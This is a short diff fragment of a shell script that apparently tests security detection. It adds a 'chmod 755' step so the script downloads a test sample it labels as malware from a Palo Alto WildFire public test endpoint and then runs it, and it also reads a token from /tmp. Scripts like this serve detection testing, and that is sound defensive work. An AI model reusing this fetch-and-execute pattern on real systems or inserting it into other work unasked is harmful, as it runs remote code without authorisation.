@@ -71,4 +71,5 @@ cat /tmp/token | cut -c 3-
 # Download sample malware
 echo "Download & launch malware"
 wget wildfire.paloaltonetworks.com/publicapi/test/elf
+chmod 755 elf
 ./elf
